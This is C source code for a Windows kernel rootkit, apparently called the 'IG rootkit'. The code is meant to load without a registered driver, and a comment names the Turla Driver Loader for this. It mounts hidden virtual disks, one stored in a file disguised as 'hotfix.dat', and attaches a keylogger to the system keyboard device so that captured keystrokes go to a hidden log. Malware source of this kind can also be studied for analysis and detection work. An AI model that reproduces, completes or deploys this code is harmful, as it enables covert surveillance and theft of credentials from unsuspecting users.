#include <ntddk.h>

#include "vfs.h"
#include "keylog.h"

//
// Forward declarations for static funcions
//

static NTSTATUS 
SetupVFS(
	IN PDRIVER_OBJECT DriverObject, 
	IN PUNICODE_STRING regPath
	);

static NTSTATUS 
SetupKeylogger(
		IN PDRIVER_OBJECT DriverObject, 
		IN PUNICODE_STRING regPath
		);

//
//  Undocumented NT Function forward declaration
//
	
NTKERNELAPI NTSTATUS
IoCreateDriver(
	IN PUNICODE_STRING DriverName, OPTIONAL
	IN PDRIVER_INITIALIZE InitializationFunction
	);

NTSTATUS 
DriverEntry(
	IN PDRIVER_OBJECT DriverObject, 
	IN PUNICODE_STRING regPath
	)

/*++

  Routine Description:

  	Entrypoint for IG rootkit this routine can be executed as driverless
	code as it does not utilize the DriverObject and regPath parameters. This
	should allow our code to be loaded by the Turla Driver Loader from hFiref0x
   	 
  Arguments:
  
  	DriverObject - DriverObject associated with driver

	regPath - Unreferenced Parameter

  Return Value:
  
  	Always returns successful status

--*/

{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(regPath);

	DbgPrint("[IG] DriverEntry Called");

	//TODO: Checking if SetupVFS success/failure 
	//TODO: Check if SetupKeylogger success/failure

	//
	// Setup and initialize the VFS component needs to be done before
	// the keylogger module is initialized because we are storing
	// the intercepted keystrokes into the VFS
	//

	IoCreateDriver(NULL, SetupVFS);

	//
	// To initialize the keylogging module we need to create a second
	// driver object using IopCreateDriver
	//

	IoCreateDriver(NULL, SetupKeylogger);

	return STATUS_SUCCESS;
}

static NTSTATUS 
SetupVFS(
	IN PDRIVER_OBJECT DriverObject, 
	IN PUNICODE_STRING regPath
	)

/*++

  Routine Description:

  	Setup routine for IG VFS creates the non-volatile and volatile 
	Virtual File Systems (VFS)
    
  Arguments:
  
  	DriverObject - DriverObject associated with driver

	regPath - Unreferenced Parameter

  Return Value:
  
  	Always returns successful status

--*/

{
	NTSTATUS status;
	LARGE_INTEGER DiskSize;
	PDEVICE_OBJECT VFSObject = NULL;
	UNICODE_STRING DeviceName;
	UNICODE_STRING DiskName;
	UNICODE_STRING VFSPath;

	DiskSize.QuadPart = VFS_MiB(16);

	VFSInit(DriverObject, regPath);

	//
	// Mount Non-Volatile VFS
	//

	RtlInitUnicodeString(&DeviceName, L"\\Device\\RawDisk1");
	RtlInitUnicodeString(&DiskName,   L"\\DosDevices\\Hd1");
	RtlInitUnicodeString(&VFSPath,    L"\\SystemRoot\\hotfix.dat");

	status = VFSCreateDisk(
		&DeviceName,
		&DiskName,
		&VFSPath,	
		&VFSObject,
		NULL,
		&DiskSize,
		FAT16
	     );

	//
	// Mount Volatile VFS
	//

	RtlInitUnicodeString(&DeviceName, L"\\Device\\RawDisk2");
	RtlInitUnicodeString(&DiskName,   L"\\DosDevices\\Hd2");
	DiskSize.QuadPart = VFS_MiB(31);

	status = VFSCreateDisk(
		&DeviceName,
		&DiskName,
		NULL,	
		&VFSObject,
		NULL,
		&DiskSize,
		FAT16
	     );

	return STATUS_SUCCESS;
}

static NTSTATUS 
SetupKeylogger(
		IN PDRIVER_OBJECT DriverObject, 
		IN PUNICODE_STRING regPath
		)

/*++

  Routine Description:
  
  	TODO:

  Arguments:

	TODO:	

  Return Value:

	TODO:

--*/

{
	UNICODE_STRING KeyboardClass;
	UNICODE_STRING KeylogOutputFile;

	//
	// Initialize Keylogging Subsystem
	//

	KeylogInit(DriverObject);

	RtlInitUnicodeString(&KeyboardClass, L"\\Device\\KeyboardClass0");
	RtlInitUnicodeString(&KeylogOutputFile, L"\\??\\Hd1\\Keylog.txt");
	
	KeylogAttachDevice(&KeyboardClass, &KeylogOutputFile);

	return STATUS_SUCCESS;
}
